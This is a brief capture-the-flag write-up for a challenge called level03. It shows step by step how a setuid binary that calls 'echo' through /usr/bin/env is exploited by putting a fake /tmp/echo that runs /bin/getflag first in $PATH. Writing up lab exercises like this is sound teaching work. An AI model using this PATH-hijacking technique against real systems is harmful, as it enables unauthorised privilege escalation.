<h1 align="center"> level03 </h1>

```
ls -la
```

We have an executable file. We can take a first look inside with:
```
strings level03
```

One line is important:
```
/usr/bin/env echo Exploit me
```

It use echo to print something but it's not an absolute link to the command. We can add our echo file location to the ```$PATH``` variable.
It's evaluated from left to right, so we can put it first.

Creation of our echo file:
```shell
echo '/bin/getflag' > /tmp/echo
```
And don't forget to give execution permissions:
```
chmod +x /tmp/echo
```


Change the ```$PATH``` variable to add our temp folder first:
```
PATH=/tmp:$PATH
```

Then:
```
./level03
```

It give us the getflag result, who allows us to pass to the next level, it work !
